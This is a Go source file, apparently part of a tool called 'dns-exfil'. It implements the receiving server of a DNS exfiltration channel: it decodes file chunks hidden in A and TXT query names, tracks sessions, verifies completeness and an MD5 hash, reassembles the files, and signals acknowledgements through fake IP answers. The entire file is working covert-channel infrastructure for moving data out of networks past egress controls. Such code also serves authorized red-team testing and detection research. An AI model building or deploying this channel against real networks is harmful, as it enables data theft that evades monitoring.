package server

import (
	"log"
	"net"

	"github.com/miekg/dns"
	"github.com/rcoop/dns-exfil/internal/protocol"
)

// Handler implements dns.Handler and routes incoming DNS queries.
type Handler struct {
	BaseDomain string
	Store      *SessionStore
	Assembler  *Assembler
}

// ServeDNS handles an incoming DNS query.
func (h *Handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	if len(r.Question) == 0 {
		w.WriteMsg(m)
		return
	}

	q := r.Question[0]
	if q.Qtype != dns.TypeA && q.Qtype != dns.TypeTXT {
		w.WriteMsg(m)
		return
	}

	msg, err := protocol.ParseQuery(q.Name, h.BaseDomain)
	if err != nil {
		log.Printf("parse error: %v (query: %s)", err, q.Name)
		h.respond(m, w, q.Name, protocol.IPNack, q.Qtype)
		return
	}

	switch v := msg.(type) {
	case *protocol.InitMessage:
		h.handleInit(m, w, q.Name, v, q.Qtype)
	case *protocol.DataMessage:
		h.handleData(m, w, q.Name, v, q.Qtype)
	case *protocol.FinMessage:
		h.handleFin(m, w, q.Name, v, q.Qtype)
	default:
		h.respond(m, w, q.Name, protocol.IPNack, q.Qtype)
	}
}

func (h *Handler) handleInit(m *dns.Msg, w dns.ResponseWriter, name string, msg *protocol.InitMessage, qtype uint16) {
	log.Printf("[%s] INIT: filename=%s total=%d", msg.SessionID, msg.Filename, msg.Total)

	session := NewSession(msg.SessionID, msg.Filename, msg.Salt, msg.Total)
	h.Store.Create(session)

	h.respond(m, w, name, protocol.IPAck, qtype)
}

func (h *Handler) handleData(m *dns.Msg, w dns.ResponseWriter, name string, msg *protocol.DataMessage, qtype uint16) {
	session := h.Store.Get(msg.SessionID)
	if session == nil {
		log.Printf("[%s] DATA seq=%d: unknown session", msg.SessionID, msg.Seq)
		h.respond(m, w, name, protocol.IPNack, qtype)
		return
	}

	session.StoreChunk(msg.Seq, msg.Data)
	log.Printf("[%s] DATA seq=%d/%d stored (%d bytes)", msg.SessionID, msg.Seq, msg.Total, len(msg.Data))

	h.respond(m, w, name, protocol.IPAck, qtype)
}

func (h *Handler) handleFin(m *dns.Msg, w dns.ResponseWriter, name string, msg *protocol.FinMessage, qtype uint16) {
	session := h.Store.Get(msg.SessionID)
	if session == nil {
		log.Printf("[%s] FIN: unknown session", msg.SessionID)
		h.respond(m, w, name, protocol.IPNack, qtype)
		return
	}

	if !session.IsComplete() {
		missing := session.MissingChunks()
		log.Printf("[%s] FIN: incomplete, missing %d chunks: %v", msg.SessionID, len(missing), missing)
		h.respond(m, w, name, protocol.IPIncomplete, qtype)
		return
	}

	if err := h.Assembler.Assemble(session, msg.MD5); err != nil {
		log.Printf("[%s] FIN: assembly error: %v", msg.SessionID, err)
		h.respond(m, w, name, protocol.IPNack, qtype)
		return
	}

	h.Store.Delete(msg.SessionID)
	log.Printf("[%s] FIN: complete", msg.SessionID)
	h.respond(m, w, name, protocol.IPComplete, qtype)
}

func (h *Handler) respond(m *dns.Msg, w dns.ResponseWriter, name string, ip net.IP, qtype uint16) {
	var rr dns.RR
	if qtype == dns.TypeTXT {
		rr = &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{ip.String()},
		}
	} else {
		rr = &dns.A{
			Hdr: dns.RR_Header{
				Name:   name,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			A: ip,
		}
	}
	m.Answer = append(m.Answer, rr)
	if err := w.WriteMsg(m); err != nil {
		log.Printf("write error: %v", err)
	}
}
